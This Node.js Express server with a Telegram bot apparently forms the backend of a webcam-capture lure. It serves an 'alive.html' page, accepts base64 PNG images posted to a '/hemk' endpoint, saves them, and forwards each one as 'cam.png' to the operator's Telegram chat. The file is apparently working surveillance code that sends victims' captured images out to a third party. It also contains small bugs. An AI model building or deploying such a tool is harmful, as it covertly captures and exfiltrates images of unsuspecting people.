const express = require("express")
const path = require("path")
const fs = require("fs")
const app = express();
require("dotenv").config()
const telegramBot = require("node-telegram-bot-api")
const base64 = require("base64-to-image")
var chatId = "";
//bot
const bot = new telegramBot(process.env.bot_token,{polling:true})
//msg
bot.on("message",async(msg)=>{
  chatId = await msg.chat.id
  if(msg.text =="/start"){
    var key = {
      reply_markup :{
        resize_keyboard:true,
        keyboard:[[{text:"About"}]]
      }
    }
  bot.sendMessage(chatId,`ℍ𝕚! @${msg.text.username}
𝕓𝕠𝕥 𝕔𝕣𝕖𝕒𝕥𝕖𝕕 𝕓𝕪  @rifas11`,key)
  }else if(msg.text == "About"){
    bot.sendMessage(chatId,"𝔹𝕠𝕥 𝕔𝕣𝕖𝕒𝕖𝕕 𝕓𝕪 @rifas11")
  }
})
//setup
app.use(express.urlencoded({extended:true, limit:"50mb"}));
app.use(express.json({limit:"50mb"}));
app.get("/",(req,res)=>{
  res.sendFile(path.join(__dirname,"alive.html"))

})
app.post("/hemk",async (req,res)=>{
  const img = await req.body.img;
  var res = img.replace("data:image/png;base64,","");
  const buffer = Buffer.from(res,"base64")
  
  fs.writeFile(`${Math.round(Math.random() *
  1000000)}.png`,buffer,(err)=>{
    if(!err){
      console.log("saved")
    }
  })
  var info={
filename:"cam.png",
contentType: 'image/png'
};
try{
  bot.sendPhoto(parseInt(chatId) || process.env.chatId,buffer,{},info)
}catch(err){
  throw err;
}
  
})
app.listen(3000,()=>{
  console.log("running at port 3000")
})
